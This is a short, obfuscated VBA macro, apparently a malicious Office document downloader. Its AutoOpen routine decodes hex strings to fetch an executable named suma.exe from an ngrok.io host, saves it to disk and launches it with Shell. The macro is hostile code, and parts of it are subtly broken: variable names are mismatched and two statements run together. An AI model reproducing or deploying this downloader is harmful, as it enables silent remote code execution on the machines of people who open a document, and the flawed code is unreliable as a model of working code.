
Sub AutoOpen()
Dim xHttp: Set ngdngvveelcihfmxxv = CreateObject(taeiloesejvp("4d6963726f736f66742e584d4c485454") & taeiloesejvp("50"))
Dim bStrm: Set zvpuuhqgdeaae = CreateObject(taeiloesejvp("41646f64622e") & taeiloesejvp("53747265616d"))
xHttp.Open taeiloesejvp("474554"), taeiloesejvp("687474703a2f2f6534393661636365613830362e6e67726f6b2e696f2f6578616d706c652f73756d612e6578") & taeiloesejvp("65"), False
xHttp.Send
With zvpuuhqgdeaae
.Type = 1 
.Open
.write ngdngvveelcihfmxxv.responseBody
.savetofile taeiloesejvp("73756d") & taeiloesejvp("612e657865"), 2 
End With
Shell (taeiloesejvp("73") & taeiloesejvp("756d612e657865"))
End SubPrivate Function taeiloesejvp(ByVal yomiddkyrxnq ) 
Dim hpcovebivucv 
For hpcovebivucv = 1 To Len(yomiddkyrxnq) Step 2
taeiloesejvp = taeiloesejvp & Chr(CInt("&H" & Mid(yomiddkyrxnq, hpcovebivucv, 2)))
Next '//hpcovebivucv
End Function

AutoOpen
